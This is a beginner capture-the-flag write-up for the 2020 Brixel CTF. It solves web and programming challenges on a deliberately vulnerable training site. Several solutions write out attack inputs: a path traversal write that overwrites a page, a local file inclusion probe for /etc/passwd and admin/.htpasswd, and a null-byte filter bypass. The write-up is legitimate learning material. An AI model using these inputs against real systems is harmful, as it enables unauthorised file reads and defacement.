# 2020 Brixel CTF

Week long beginner friendly ctf taking place December 2020

## Overview

## Internet 5: Easy

**Challenge**

On the homepage there is a hidden flag. It's a Source of easy points!

**Solution**
Looking at the source for the home page there's an html comment containing the flag

**Flag**

```
<!-- hidden flag: 'brixelCTF{notsosecret}' -->
```

## Internet 5: Hidden Code

**Challenge**

Something strange happens on the brixel website when you enter the konami code

flag = the character you see floating by

**Solution**

I had to Google the konami code, it's been years since I've played a game of Contra.  The code is as follows, and in some older video games you could perform those button presses on the home screen to unlock something helpful in the game
```
Up, Up, Down, Down, Left, Right, Left, Right, B, A
```

Navigating to the brixel website and performing those same button presses causes an animation of Mario to run across the screen.  Given the hint that the flag is the character that floats by, the flag is Mario. 

**Flag**

```Mario```

## Internet 5: robotopia

**Challenge**

I found this cool website, it claims to be 100% robot-free!

There's nothing there yet at the moment, but at least it's robots-free. I wonder how they keep it that way?

http://timesink.be/robotopia/

**Solution**

Given the amount of time's the word 'robot' was mentioned, it seemed obvious to check the robots.txt file, which had the flag right there. 

**Flag**

```
#you found a flag! it is: brixelCTF{sadr0b0tz}
```

## Internet 5: login1

**Challenge**

My buddy is trying to become a web developer, he made this little login page. Can you get the password?

http://timesink.be/login1/index.html

**Solution**

The link included in the challenge brings you to a login form.  Looking at the source for the form, it has the verify javascript function included with the password hardcoded.

```
<script type="text/javascript">
	function verify() {
		password = document.getElementById("the_password").value;
		if(password == "brixelCTF{w0rst_j4v4scr1pt_3v3r!}")
		{
			alert("Password Verified");
		}
		else 
		{
		alert("Incorrect password");
		}
	}
</script>
```

**Flag**

```
brixelCTF{w0rst_j4v4scr1pt_3v3r!}
```

## Internet 5: login2

**Challenge**

Cool, you found the first password! He secured it more, could you try again?

http://timesink.be/login2/index.html

**Solution**

We are again presented with a login form.  However, this time it looks like the verify function has been obfuxcated a little bit.

```
function verify() {
		password = document.getElementById("the_password").value;
		split = 6;
		if (password.substring(0, split) == 'brixel') 
		{
			if (password.substring(split*6, split*7) == '180790') 
			{
				if (password.substring(split, split*2) == 'CTF{st') 
				{
					if (password.substring(split*4, split*5) == '5cr1pt') 
					{
						if (password.substring(split*3, split*4) == 'd_j4v4') 
						{
							if (password.substring(split*5, split*6) == '_h3r3.') 
							{
								if (password.substring(split*2, split*3) == '1ll_b4') 
								{
									if (password.substring(split*7, split*8) == '54270}') 
									{
										alert("Password Verified")
									}
								}
							}
						}
					}
				}
			}
		}
		else 
		{
		alert("Incorrect password");
		}
	}
```

The solution however is as easy as concatenating all the password splits. 
```
(0, split), (split, split*2), (split*2, split*3), (split*3, split*4), etc...
```

**Flag**

```
brixelCTF{st1ll_b4d_j4v45cr1pt_h3r3.18079054270}
```

## Internet 5: login3

**Challenge**

Nice! you found another one! He changed it up a bit again, could you try again?

http://timesink.be/login3/index.html

**Solution**

Yet again, another javascript verify function.

```
function verify() {
		username = document.getElementById("the_username").value;
		password = document.getElementById("the_password").value;
		if(username == readTextFile("username.txt"))
		{
			if(password == readTextFile("password.txt"))
			{
				alert("Password Verified");
			} else {
				alert("Incorrect password");
			}
		}else{
			alert("Incorrect username");
		}
		
	}
  ```
This time, the password is being read from a text file stored alongside the login form.  Let's see if we can get that password.txt file...

http://timesink.be/login3/password.txt

**Flag**

```brixelCTF{n0t_3v3n_cl05e_t0_s3cur3!}```

## Intrernet 5: login4

**Challenge**

Whow, another one! You're good! So I told my buddy how you managed to get the password last time, and he fixed it. Could you check again please?

http://timesink.be/login4/index.html

**Solution**

This challenge is very similar to the previous challenge, but this time when you get the password.txt file, it's base64 encrypted.  There's two ways to go about solving this, you could just copy that base64 string and decode it to get the flag, or you could just copy the line of javascript where they are decoding the password.txt file, and paste it in the developer tools console.

```
atob(readTextFile("password.txt"))
```

**Flag**

```
brixelCTF{even_base64_wont_make_you_secure}
```

## Internet 15: Dadjokes

**Challenge**

Darn! Some idiot scriptkiddy broke my favorite website full of dad jokes!

I can't seem to contact the owner to fix the site

Can you bring it back and remove the defaced page?

**Solution**

The link takes you to a site that has clearly been defaced. Looking at the source, there's a comment that says:
```html
<!-- Hey bozo! I left your original index file under index_backup.html so you can see how your site looked before I used my l33t skillz to deface it. -->
```
Navigating to /index_backup.html we find that we can submit a new dad joke, or read a dad joke.  Looking at the submit feature, it looks like it includes information about the joke that you are submitting in the URI.
```
http://timesink.be/dadjokes/jokes/submit.php?filename=test.txt&title=test&content=test
```
I was most interested in that filename parameter.  Changing that to test.php and then trying to submit gets a clue from the creator:
```
You're on the right track, but I'm not going to allow this in here, try that somewhere else!
```
So we can't create a php file and get code execution, but maybe this is how the attackers defaced the main page? I thought to try to change the filename to index.html
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=test&submit=true
```
This results in a different hint from the creator:
```
You are definitely on the right track here... but what are you trying to accomplish?
```
Thinking back to the challenge, they wanted me to bring back the original dadjokes site. I thought that maybe I needed to include the source for the index_backup.html page. 
```
http://timesink.be/dadjokes/jokes/submit.php?filename=../index.html&title=test&content=%3Chtml%3E%3Ctitle%3EDadJokes,%20your%20source%20of%20lame%20dad%20jokes%3C/title%3E%3Cbody%3E%3Cdiv%20align=%22center%22%3E%3Ch1%3EDadJokes%3C/h1%3E%3Chr%3E%3Cimg%20src=%22images/banner.png%22%20alt=%22dadjokes%22%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/read.php%22%3ERead%20dad%20jokes%3C/a%3E%3Cbr%3E%3Cbr%3E%3Ca%20href=%22jokes/submit.php%22%3Esubmit%20your%20own%20jokes%3C/a%3E%3C/div%3E%3C/html%3E&submit=true
```
That worked! We are given the flag after submitting that payload.

**Flag**

```
brixelCTF{lamejoke}
```

## Internet 15: Pathfinders #1
**Challenge**

These f*cking religious sects!

These guys brainwashed my niece into their demeted world of i-readings and other such nonsense.

The feds recently closed their churches, but it seems they are preparing for a new online platform to continue their malicious activities.

can you gain access to their admin panel to shut them down?

Their website is: http://timesink.be/pathfinder/

**Solution**

Navigating to the pathfinders homepage, it is immediately evident that the challenge is going to involve some sort of local file inclusion(LFI).  I assume this, because we have control over the page paremeter in the URL.  Using the members/locations links, the page paremeter changes to members.php and locations.php respectively.  
First thing I tried was to find the passwd file, just to see if there was a LFI vulnerability.
```
http://timesink.be/pathfinder/index.php?page=../../../../../../etc/passwd
```

This results in a hint from the creator, but I guess I'm on the wrong path
```
naughty, naughty! you're only supposed to go after stuff in admin! no back traversing!/
```

Based on that hint, I started trying to find files in the admin folder, starting with the index page for the admin portal:
```
http://timesink.be/pathfinder/index.php?page=admin/index.php
```
This looks like I'm on the right path, but not quite there:
```
There is nothing here! not even bonus points I'm afraid :( you should get the password, not the page.
```
So if I'm trying to find the password, I figured I should look for config files. I first thought I needed to brute force the admin directory, looking for a php file that would contain a password. However, while manually fuzzing the directory I found the solution
```
http://timesink.be/pathfinder/index.php?page=admin/.htpasswd
```


**Flag**

```
#normally you would brute force this, but that is not in scope of this challenge. The flag is: brixelCTF{unsafe_include}
admin:$apr1$941ydmlw$aPUW.gCFcvUbIcP0ptVQF0
```

## Internet 20: Pathfinders #2
**Challenge**

It seems they updated their security. can you get the password for their admin section on their new site?

http://timesink.be/pathfinder2/

oh yeah, let's assume they are running a php version below 5.3.4 here...

**Solution**

This page looks very similar to the previous pathfinder challenge, except there's a new warning at the bottom of the page
```
Due to a recent hacker intrusion, we upgraded our security to only allow for php files to be included.
```

Testing the solution to the previous challenge, we see that it's now filtering any file that doesn't have the '.php' extension
```
file not ending in .php, terminating.
```

Since they hinted that this site is running an outdated version of php, I thought to try including a null byte
```
http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00
```
That still doesn't work, but tacking '.php' onto the end of the null byte gets us the flag!
```
http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00.php
```

**Flag**

```
Great work! the flag is brixelCTF{outdated_php}
```

## Programming 10: Are you fast enough?

**Challenge**

Can you program something that is fast enough to submit the solution before the time runs out?

http://timesink.be/speedy

**Solution**

The link in the challenge takes you to a site with a random string, a field to enter that string, and instructions to enter that random string within 1 second to win. 

I wrote a really simple python script using beautifulsoup and requests to grab the string and post it back to the site.  

```
import requests
from bs4 import BeautifulSoup

s = requests.Session()

#get the text from the page, which should have the random string
r = s.get('http://timesink.be/speedy/').text

soup = BeautifulSoup(r,'lxml')
#Grab the random string by it's div id using beautifulsoup
val = soup.find("div", {'id': 'rndstring'}).text

#I printed the value of the randomstring just to test that it was scraped correctly
print(val)

#This is probably not necessary given we are using a session, but I was in a rush and didn't want to not include it and end up needing it
cookies= {'PHPSESSID':'594e17ae1b3a1ff2488059810b118345'}

#val = the random string I scraped
payload = {'inputfield':val}
print(payload)
p = s.post('http://timesink.be/speedy/index.php', data = payload, cookies=cookies)
print(p)
#this should have the flag
print(p.text)
```

**Flag**

```
brixelCTF{sp33d_d3m0n}
```

## Programming 10: Keep walking...

**Challenge**

This is a challenge to test your basic programming skills.

Pseudo code:
Set X = 1
Set Y = 1
Set previous answer = 1
answer = X * Y + previous answer + 3
After that => X + 1 and Y + 1 ('answer' becomes 'previous answer') and repeat this till you have X = 525.
The final answer is the value of 'answer' when X = 525. Fill it in below.

Example:
5 = 1 * 1 + 1 + 3

12 = 2 * 2 + 5 + 3

24 = 3 * 3 + 12 + 3
........................
........................

**Solution**

You just need to write some real code that follows the logic of the given pseudo code. I've included my python code below, but since we already have pseudo code I won't really dive into it. 

```
x = 1
prev = 1
final = 0

while x < 526:
	final = (x*x) + prev + 3
	prev=final
	x+=1
	
print(final)
```

**Flag**

```
48373851
```

Programming 10: A song...

**Challenge**

I wrote this song

it seems I'm pretty bad at it, but hey! it could get you a flag :)
